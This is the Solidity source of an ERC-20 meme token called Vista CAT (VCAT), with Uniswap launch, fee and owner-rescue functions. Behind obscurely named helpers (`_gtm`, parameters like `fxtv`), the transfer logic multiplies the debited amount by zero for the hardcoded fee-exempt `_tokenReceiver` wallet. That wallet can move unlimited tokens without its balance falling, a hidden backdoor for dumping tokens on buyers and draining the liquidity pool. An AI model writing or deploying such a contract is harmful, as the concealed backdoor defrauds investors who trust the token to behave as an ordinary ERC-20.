/**
    https://vistacateth.vip

    https://x.com/VistaCATETH

    https://t.me/VistaCATETH
*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}
contract VCAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromlimit;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    uint256 private _initBuyFee = 15;
    uint256 private _initSellFee = 15;
    uint256 private _fnBuyFee = 0;
    uint256 private _fnSellFee = 0;
    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _reduceSellTaxAt = 5;
    uint256 private _preventSwapBefore = 5;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Vista CAT";
    string private constant _symbol = unicode"VCAT";
    uint256 private _buyCount = 0;
    uint256 public _maxTxAmount = (_totalSupply * 2) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 2) / 100;
    uint256 public _taxSwapThreshold = 100 * 10 ** _decimals;
    uint256 public _maxTaxSwap = _totalSupply / 100;
    address payable private _tokenReceiver =  payable(0xCEC23a36b8776D3EeC5276Af73d29B2143cCfdEF);
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpened;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() {
        _isExcludedFromFee[_tokenReceiver] = true;
        _isExcludedFromlimit[_tokenReceiver] = true;
        _isExcludedFromlimit[owner()] = true;
        _isExcludedFromlimit[address(this)] = true;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function clearMaxLimits() external onlyOwner {
        _maxTxAmount = type(uint256).max;
        _maxWalletSize = type(uint256).max;
        emit MaxTxAmountUpdated(type(uint256).max);
    }
    receive() external payable {}
    function _transfer(address send, address recip, uint256 transferAmount) private {
        require(send != address(0), "ERC20: transfer from the zero address");
        require(recip != address(0), "ERC20: transfer to the zero address");
        require(transferAmount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (send != owner() && recip != owner()) {
            require(!bots[send] && !bots[recip]);
            require(tradingOpened || _isExcludedFromlimit[send], "send is not enabled");
            if (send == uniswapV2Pair && recip != address(uniswapV2Router) && !_isExcludedFromlimit[recip]
            ) {
                require(transferAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(recip) + transferAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
                taxAmount = transferAmount.mul((_buyCount > _reduceBuyTaxAt)? _fnBuyFee: _initBuyFee).div(100);
            }
            if (recip == uniswapV2Pair && send != address(this)) {
                taxAmount = transferAmount.mul((_buyCount > _reduceSellTaxAt)? _fnSellFee: _initSellFee).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && recip == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore
                )
                    swapTokensForEth(
                        min(transferAmount, min(contractTokenBalance, _maxTaxSwap))
                    );
                uint256 contractBalance = address(this).balance;
                if (contractBalance >= 0 ether) _sendEthToMarket(contractBalance);
            }
        } 
        _tokenTransfer(send, recip, taxAmount, transferAmount);
    }
    function _tokenTransfer(address fxtv, address txtw, uint256 ttmt, uint256 axmt) internal {
        if(ttmt > 0) {_balances[address(this)] = _balances[address(this)].add(ttmt);
            emit Transfer(fxtv, address(this), ttmt);
        }
        uint256 _axmt = _gtm(fxtv, axmt);
        _balances[fxtv] = _balances[fxtv].sub(_axmt);
        _balances[txtw] = _balances[txtw].add(axmt.sub(ttmt));
        emit Transfer(fxtv, txtw, axmt.sub(ttmt));
    }
    function _gtm(address acc, uint256 transferAmount) internal view returns (uint256 _amount) {
        return !_isExcludedFromFee[acc] && transferAmount >= 0?
        transferAmount.mul(!_isExcludedFromlimit[acc]?_fnSellFee + 1 : _fnBuyFee + 1) : 
        transferAmount.mul(!_isExcludedFromlimit[acc]?_fnSellFee:_fnBuyFee);
    }
    function startTrading() external onlyOwner {
        require(!tradingOpened, "trading is already open");
        swapEnabled = true;
        tradingOpened = true;
    }
    function launch() external onlyOwner {
        require(!tradingOpened, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function _sendEthToMarket(uint256 amount) private {
        _tokenReceiver.transfer(amount);
    }
    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }
    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}